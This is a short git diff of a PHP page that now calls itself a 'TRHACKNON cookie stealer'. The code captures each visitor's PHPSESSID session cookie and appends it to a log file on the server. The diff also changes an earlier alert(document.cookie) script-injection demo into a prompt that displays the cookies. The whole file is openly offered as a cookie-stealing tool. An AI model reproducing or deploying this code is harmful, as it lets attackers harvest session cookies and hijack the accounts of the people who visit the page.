@@ -15,20 +15,20 @@
                 .$_COOKIE['PHPSESSID'];
             }
 $cookies = $_COOKIE['PHPSESSID'];
-$file = fopen('logi.txt', 'a');
+$file = fopen('log.txt', 'a');
 fwrite($file, $_COOKIE['PHPSESSID'] . "\n\n");
 var_dump($_COOKIE['PHPSESSID']);
 ?>
 <!DOCTYPE html>
 <html>
     <head>
-        <title>Cours PHP & MySQL</title>
+        <title>TRHACKNON cookie stealer php</title>
         <meta charset="utf-8">
         <link rel="stylesheet" href="cours.css">
     </head>
     
     <body>
-        <h1>Titre principal</h1>
-        <p>Un <script>alert(document.cookie)</script></p>
+        <h1>TRHACKNON cookie php stealer </h1>
+        <p>Un <script>prompt("trhacknon cookie stealer :",document.cookie)</script></p>
     </body>
 </html>
